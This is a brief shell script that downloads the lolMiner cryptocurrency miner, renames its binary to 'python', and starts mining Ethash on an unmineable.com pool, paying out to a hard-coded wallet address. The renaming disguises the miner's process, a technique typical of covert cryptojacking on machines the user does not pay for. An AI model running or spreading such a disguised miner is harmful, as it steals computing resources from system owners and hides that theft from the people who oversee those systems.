curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
tar -zxvf python.tar.gz
cd 1.31
mv lolMiner python
./python --algo ETHASH --pool ethash.unmineable.com:3333 --user COIN:TYSnLDWrR5TmqgRKTM2ApKkng5ZW9j9iaH.K80 --ethstratum ETHPROXY
